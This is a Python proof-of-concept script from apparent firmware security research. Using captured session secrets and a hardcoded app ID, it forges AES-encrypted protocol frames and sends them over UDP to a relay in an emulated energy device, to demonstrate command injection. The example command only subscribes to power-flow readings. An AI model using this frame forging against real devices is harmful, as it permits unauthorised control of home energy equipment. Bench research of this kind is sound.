#!/usr/bin/env python3
"""Send a command to the emulated device over the e2e/msct relay.

Proves command injection into the firmware: build a PROTOCOL.md §4.3 command
frame (AES-256-CBC, nonce, msgid, tags) and send it to the fake relay, which
forwards it to the device session and routes the answer back.

Needs (private bench files, never commit):
  /sandbox/e2e_login_real.json  {"plain": <device e2e-bmt-login response>}
  /sandbox/e2e_sender.json      <app/user e2e triplet from a capture>
Run inside the guest (slirp does not let the host initiate into 10.0.2.x).

Example: 0x30/0xA0 = subscribe power flow; the device answers 211 bytes whose
ciphertext tail is the 22-byte payload (battery/solar/grid/... s16 x100 W).
"""
import json, socket, time, random, string
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import pad, unpad
dev=json.load(open('/sandbox/e2e_login_real.json'))['plain']
snd=json.load(open('/sandbox/e2e_sender.json'))
SEND=snd['sender_end_id'].encode(); SGRP=snd['sender_group_id'].encode(); SSEC=snd['sender_end_secret'].encode()
RECV=dev['end_id'].encode(); DKEY=dev['chat_secret'].encode()
APPID=b'CXRqKjx2MzSAkdyucR9NDyPiiQR2vQcQ'
def mid():
    return ('and_'+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(10))+str(int(time.time()*1000))).encode()
def alive(n):
    ct=AES.new(SSEC,AES.MODE_CBC,n).encrypt(pad(b'{"__time":'+str(int(time.time())).encode()+b'}',16))
    return b'\xD9\xA0\xA0'+SEND+b'\xA0\xA1'+SGRP+b'\x90\xA3'+n+b'\x85\xF5b"alive"'+b'\x9B\xF6'+mid()+b'\x10\xB7'+b'application/json'+ct
def cmd(t,m,p,n):
    ct=AES.new(DKEY,AES.MODE_CBC,n).encrypt(pad(p,16))
    return (b'\xD9\xA0\xA0'+SEND+b'\xA0\xA1'+SGRP+b'\xA0\xA2'+RECV+b'\x90\xA3'+n+
            b'\x81\xF1\x01'+b'\xA0\xB5'+APPID+b'\x82\xF5'+bytes([t,m])+b'\x9B\xF6'+mid()+
            b'\x10\xB7'+b'application/byte'+ct)
relay=('10.0.2.3',1050)
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind(('0.0.0.0',0)); s.settimeout(1.5)
s.sendto(alive(b'A'*16),relay); time.sleep(0.2)
NONCE=b'C'*16
s.sendto(cmd(0x30,0xA0,b'',NONCE),relay)
i=0; end=time.time()+5
while time.time()<end:
    try: d,a=s.recvfrom(4096)
    except socket.timeout: continue
    open('/sandbox/rx%d.bin'%i,'wb').write(d)
    print("rx%d"%i,len(d),d[:16].hex()); i+=1
print("saved",i)
